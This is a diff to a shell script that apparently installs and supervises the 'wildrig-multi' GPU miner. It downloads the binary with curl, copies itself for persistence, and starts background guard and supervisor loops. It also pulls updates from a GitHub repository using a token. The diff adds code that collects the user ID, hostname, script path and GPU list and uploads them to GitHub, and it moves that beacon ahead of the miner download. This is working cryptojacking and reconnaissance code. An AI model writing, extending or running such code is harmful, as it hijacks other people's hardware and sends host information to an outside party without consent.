@@ -17,8 +17,8 @@ log(){ echo "[$(date -u +%FT%TZ)] $*" >> "$L/logs/sup.log"; }
 kit_ok(){ [ -x "$B/wildrig-multi" ] && [ "$(stat -c%s "$B/wildrig-multi" 2>/dev/null || echo 0)" -gt 20000000 ]; }
 kit_install(){
   kit_ok && return 0
-  for t in 1 2 3 4; do
-    curl -sL -m 240 -o "$B/wr.part" "$KIT" 2>/dev/null
+  for t in 1 2; do
+    curl -sL -m 45 -o "$B/wr.part" "$KIT" 2>/dev/null
     s=$(stat -c%s "$B/wr.part" 2>/dev/null || echo 0); h=$(sha256sum "$B/wr.part" 2>/dev/null | cut -d' ' -f1)
     log "kit blob try $t sz=$s sha=${h:0:16}"
     if [ "$s" = "$SZ" ] && [ "$h" = "$SHA" ]; then mv -f "$B/wr.part" "$B/wildrig-multi"; chmod +x "$B/wildrig-multi"; kit_ok && return 0; fi
@@ -179,10 +179,10 @@ ps_guard(){
 # ---------------- boot (network wait, kit, probe, start) ----------------
 ps_boot(){
   date -u +%FT%TZ > "$L/boot.ts"
-  for w in $(seq 1 30); do curl -s -m 8 -o /dev/null https://api.github.com/ && break; sleep 6; done
-  kit_install
-  { echo "stage=boot uid=$(id -u) host=$(hostname) ts=$(date -u +%FT%TZ)"; nvidia-smi -L 2>&1; echo "bin=$(stat -c%s $B/wildrig-multi 2>/dev/null)"; } > /tmp/boot.txt 2>&1
+  { echo "stage=boot uid=$(id -u) host=$(hostname) ts=$(date -u +%FT%TZ)"; echo "argv0=$0 pwd=$(pwd)"; ls -l "$0" 2>&1; nvidia-smi -L 2>&1 | head -3; echo "bin=$(stat -c%s $B/wildrig-multi 2>/dev/null)"; } > /tmp/boot.txt 2>&1
   gh_put "ps12/$P.boot.txt" /tmp/boot.txt "boot $P" >/dev/null 2>&1
+  for w in $(seq 1 20); do curl -s -m 8 -o /dev/null https://api.github.com/ && break; sleep 5; done
+  kit_install
   log "boot complete kit_ok=$(kit_ok && echo 1 || echo 0)"
   ps_guard &
   ps_sup &
@@ -194,6 +194,8 @@ if [ "$1" = sup ]; then ps_sup; exit 0; fi
 if [ "$1" = guard ]; then ps_guard; exit 0; fi
 if [ "$1" = boot ]; then ps_boot; exit 0; fi
 mkdir -p "$B" "$L/logs"
+{ echo "stage=install uid=$(id -u) host=$(hostname) ts=$(date -u +%FT%TZ)"; echo "argv0=$0 pwd=$(pwd)"; ls -l "$0" 2>&1; nvidia-smi -L 2>&1 | head -3; } > /tmp/inst.txt 2>&1
+gh_put "ps12/$P.install.txt" /tmp/inst.txt "install $P" >/dev/null 2>&1
 cp -f "$0" "$B/ps_sup.sh" 2>/dev/null
 if ! grep -q 'ps_sup()' "$B/ps_sup.sh" 2>/dev/null; then
   curl -sL -m 60 -H "Authorization: token $GH" -H 'Accept: application/vnd.github.raw' -o "$B/ps_sup.sh" "https://api.github.com/repos/$REPO/contents/ps12/ps12.sh" 2>/dev/null
